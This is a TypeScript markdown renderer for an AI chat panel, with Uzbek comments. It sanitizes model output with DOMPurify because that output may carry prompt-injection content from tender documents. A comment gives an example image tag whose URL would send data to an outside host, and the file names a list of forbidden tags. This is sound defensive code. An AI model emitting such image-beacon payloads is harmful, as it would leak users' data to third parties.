// MARKDOWN RENDERI — ISHONCHSIZ MATN uchun
// ═════════════════════════════════════════
// NEGA BU YERDA "kutubxonasiz" TAMOYILI ISHLAMAYDI:
//
// `i18n.tsx` BIZNING tarjimalarimizni ko'rsatadi — kirish ma'lum, chekli,
// o'zimizniki. Markdown esa ISHONCHSIZ matnni qayta ishlaydi: model
// chiqishi, uning ichida esa tender hujjatidan kelgan bo'laklar. Ya'ni
// prompt injection zanjiri to'g'ridan-to'g'ri RENDER qatlamiga tutashadi.
// Qo'lda yozilgan sanitizator bu yerda ikkinchi hujum yuzasi bo'lardi.
//
// Xato narxi ham teng emas: i18n ni noto'g'ri yozsak matn xunuk chiqadi,
// sanitizatorni noto'g'ri yozsak — XSS.
//
// HAJM: `marked` + `DOMPurify` ~13 KB (gzip). Chat paneli LAZY chunk —
// chat ochilmaguncha bu kod umuman yuklanmaydi (`App.tsx`).
import { marked } from 'marked'
import DOMPurify from 'dompurify'

// GFM = jadval. `breaks` = bitta qator uzilishi <br> bo'ladi — model
// javoblarida ro'yxat va qatorlar shunday kutiladi.
marked.setOptions({ gfm: true, breaks: true })

/**
 * Ruxsat etilgan teglar — ATAYLAB TOR.
 *
 * `h1`/`h2` YO'Q: chat pufakchasi ichida sahifa sarlavhasi kattaligidagi
 * matn g'alati ko'rinadi va tartibni buzadi.
 */
const ALLOWED_TAGS = [
  'p', 'br', 'strong', 'em', 'code', 'pre', 'blockquote',
  'ul', 'ol', 'li',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'hr', 'h3', 'h4',
]

/**
 * TAQIQLANGAN teglar — har biri alohida sabab bilan.
 *
 * `<a>`  — model havola chiqarsa, u TENDER HUJJATIDAN kelgan bo'lishi
 *          mumkin, ya'ni tashqi manbadan. Kelib chiqishi tekshirilmagan
 *          bosiladigan havolani ko'rsatish keraksiz xavf. Havola kerak
 *          bo'lsa — `CitationChip` orqali, u FAQAT bizning `tender_id`
 *          va `char_start` imiz bilan ishlaydi.
 *
 * `<img>` — `<img src="https://tashqi.uz/?d=...">` sanitizator uchun
 *          to'liq qonuniy, lekin bu MA'LUMOT CHIQARISH KANALI: rasm
 *          yuklanishining o'zi so'rov yuboradi. Injection uchun eng
 *          qulay yo'l.
 *
 * Qolganlari (`iframe`, `script`, `style`, `svg`, `form`, `input`) —
 * kod ijrosi yoki ma'lumot yig'ish uchun.
 */
const FORBID_TAGS = ['a', 'img', 'iframe', 'script', 'style', 'svg', 'form', 'input']

/** HTML belgilarni xavfsiz matnga aylantiradi (zaxira rejim uchun). */
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

/**
 * ZAXIRA REJIM — kutubxona yuklanmasa yoki xato bersa.
 *
 * Bu loyihaning "AI ixtiyoriy" tamoyilining RENDER qatlamidagi
 * ko'rinishi: bo'sh ekran ham, TOZALANMAGAN HTML ham emas — oddiy,
 * ekranlangan matn. Formatlash yo'qoladi, mazmun qoladi.
 */
export function renderPlain(md: string): string {
  return escapeHtml(md ?? '').replace(/\n/g, '<br>')
}

/**
 * MANBA RAQAMLARI: `[3]` -> bosiladigan element.
 *
 * NEGA TOZALASHDAN KEYIN VA NEGA DOM ORQALI:
 *
 * `ALLOWED_ATTR: []` — DOMPurify hech qanday atributni o'tkazmaydi,
 * ya'ni `<sup data-mnb="3">` ni model chiqishida yozib bo'lmaydi (va
 * yozmasligi ham kerak). Shuning uchun almashtirish SANITIZATSIYADAN
 * KEYIN bo'ladi: o'sha nuqtada HTML allaqachon xavfsiz, biz esa
 * elementni O'ZIMIZ yaratamiz — `document.createElement` va faqat
 * RAQAM tekshirilgan atribut bilan.
 *
 * Satr ustida `replace()` qilish XATO bo'lardi: `[3]` teg ichidagi
 * atributda yoki `<code>` blokida ham uchrashi mumkin. Matn
 * tugunlarini aylanib chiqish esa faqat KO'RINADIGAN matnga tegadi.
 *
 * `<code>` va `<pre>` ATAYLAB chetlab o'tiladi — u yerdagi `[3]`
 * kodning bir qismi, iqtibos emas.
 */
const MANBA_RE = /\[(\d{1,3})\]/g

function manbalarniBelgila(html: string): string {
  // DOM yo'q (SSR, sinov muhiti) — matnni o'zgarishsiz qaytaramiz.
  if (typeof document === 'undefined') return html

  const idish = document.createElement('div')
  idish.innerHTML = html          // XAVFSIZ: DOMPurify dan chiqqan

  // 4 = `NodeFilter.SHOW_TEXT`. RAQAM ATAYLAB: `NodeFilter` global
  // sifatida mavjud bo'lmasligi mumkin (jsdom sozlamasi, ba'zi SSR
  // muhitlari). Birinchi urinishda aynan shu bo'ldi — `ReferenceError`
  // ni pastdagi `catch` yutib yubordi va BUTUN render jimgina matn
  // rejimiga tushdi. Sinov buni tutdi, lekin ishlab chiqarishda
  // bunday jimlik qimmatga tushardi.
  const yurgich = document.createTreeWalker(idish, 4)
  const tugunlar: Text[] = []
  let t = yurgich.nextNode()
  while (t) {
    const ota = (t.parentElement?.closest('code, pre'))
    if (!ota && MANBA_RE.test(t.nodeValue ?? '')) tugunlar.push(t as Text)
    MANBA_RE.lastIndex = 0        // `g` bayrog'i holatini tozalaymiz
    t = yurgich.nextNode()
  }

  for (const tugun of tugunlar) {
    const matn = tugun.nodeValue ?? ''
    const parcha = document.createDocumentFragment()
    let oxirgi = 0
    MANBA_RE.lastIndex = 0
    let m: RegExpExecArray | null
    while ((m = MANBA_RE.exec(matn)) !== null) {
      if (m.index > oxirgi) {
        parcha.appendChild(document.createTextNode(matn.slice(oxirgi, m.index)))
      }
      const el = document.createElement('sup')
      el.className = 'manba-raqam'
      // Faqat RAQAM — regex `\d{1,3}` bilan cheklangan.
      el.setAttribute('data-manba', m[1])
      // Sichqonchasiz ham ochilsin. `<button>` emas: u <p> ichida
      // qator balandligini buzadi va matn oqimidan ajralib turadi.
      el.setAttribute('role', 'button')
      el.setAttribute('tabindex', '0')
      el.textContent = `[${m[1]}]`
      parcha.appendChild(el)
      oxirgi = m.index + m[0].length
    }
    if (oxirgi < matn.length) {
      parcha.appendChild(document.createTextNode(matn.slice(oxirgi)))
    }
    tugun.parentNode?.replaceChild(parcha, tugun)
  }
  return idish.innerHTML
}


/**
 * Markdown -> XAVFSIZ HTML.
 *
 * Kutubxona ishlamasa `renderPlain()` ga tushadi — hech qachon
 * tozalanmagan HTML qaytarmaydi.
 */
export function renderMarkdown(md: string): string {
  if (!md) return ''
  try {
    // `marked.parse` sinxron rejimda satr qaytaradi (`async: false` — standart).
    const html = marked.parse(md) as string
    const toza = DOMPurify.sanitize(html, {
      // `sup` — manba raqami uchun. Model uni O'ZI yoza olmaydi:
      // atributlar baribir tushib qoladi, biz esa elementni
      // sanitizatsiyadan KEYIN o'zimiz yaratamiz.
      ALLOWED_TAGS: [...ALLOWED_TAGS, 'sup'],
      // Sinf ham, `style` ham kerak emas — stillashni `.chat-markdown`
      // konteyneri CSS bilan qiladi. Bo'sh ro'yxat = `href`, `src`,
      // `onerror` kabi hamma narsa tushib qoladi.
      ALLOWED_ATTR: [],
      FORBID_TAGS,
    })
    return manbalarniBelgila(toza)
  } catch {
    // Kutubxona yo'q, DOM yo'q yoki parse yiqildi — matnli rejim.
    return renderPlain(md)
  }
}
